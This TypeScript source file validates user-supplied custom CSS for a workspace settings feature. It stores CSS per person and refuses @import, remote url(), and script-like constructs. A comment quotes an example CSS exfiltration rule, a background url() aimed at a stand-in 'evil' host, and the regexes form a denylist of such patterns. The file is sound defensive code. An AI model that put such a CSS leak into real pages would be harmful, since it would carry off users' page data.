// Custom CSS — letting somebody restyle their own workspace.
//
// Ed, 2026-08-29: *"I'd like to add a CSS injection into settings, so if users
// want to apply custom CSS styling for whatever reason we can allow for that."*
//
// ── This is a loaded gun, pointed at one foot ─────────────────────────────
//
// Arbitrary CSS is genuinely dangerous in ways that are easy to miss, so the
// rules below are the feature, not decoration:
//
//   • **Per person, never per agency.** A stylesheet an owner writes must not
//     reach staff or clients. One person breaking their own chrome is a
//     preference; breaking everyone's is an outage nobody can undo without a
//     developer, because the control to fix it may itself be hidden by the CSS.
//   • **It is stored, not executed.** CSS cannot run JavaScript, but it CAN
//     exfiltrate — `background: url(https://evil/?v=…)` on an attribute
//     selector leaks values. So remote URLs are refused outright.
//   • **`@import` is refused** for the same reason: it fetches, and it fetches
//     something we never see.
//   • **There is always a way out.** `?nocss=1` on any URL disables it for that
//     load, and the reset is stated on the panel. A person who hides their own
//     Settings link must not be locked out of their workspace.

/** How much CSS one person may store. Generous for a theme, small for a payload. */
export const MAX_CUSTOM_CSS_LENGTH = 20_000;

export interface CustomCssCheck {
  ok: boolean;
  /** Why it was refused — shown verbatim, so it must read as an explanation. */
  reason?: string;
}

const REMOTE_URL = /url\(\s*['"]?\s*(https?:)?\/\//i;
const IMPORT_RULE = /@import\b/i;
const EXPRESSION = /expression\s*\(|javascript\s*:|behaviour\s*:|behavior\s*:/i;

/**
 * Is this CSS safe enough to store and serve back to its own author?
 *
 * Deliberately a small denylist rather than a parser. A full CSS sanitiser is a
 * large dependency and a large attack surface of its own, and the three things
 * refused here are the three that turn a stylesheet into a network request.
 * Everything else a person can do with CSS affects only what they see.
 */
export function checkCustomCss(css: string): CustomCssCheck {
  if (css.length > MAX_CUSTOM_CSS_LENGTH) {
    return { ok: false, reason: `Too long — ${css.length.toLocaleString()} characters, the limit is ${MAX_CUSTOM_CSS_LENGTH.toLocaleString()}.` };
  }
  if (IMPORT_RULE.test(css)) {
    return { ok: false, reason: "@import is not allowed — it fetches a stylesheet we cannot see." };
  }
  if (REMOTE_URL.test(css)) {
    return { ok: false, reason: "Remote url() is not allowed — a background image can carry data off this page. Use a data: URI." };
  }
  if (EXPRESSION.test(css)) {
    return { ok: false, reason: "That looks like it is trying to run code, not style a page." };
  }
  return { ok: true };
}

/**
 * The CSS, wrapped so it cannot escape the app shell.
 *
 * Returns empty for anything that fails the check — a rejected stylesheet is
 * never partially applied, because half a theme is worse than none.
 */
export function customCssForInjection(css: string | undefined): string {
  const trimmed = (css ?? "").trim();
  if (!trimmed) return "";
  return checkCustomCss(trimmed).ok ? trimmed : "";
}
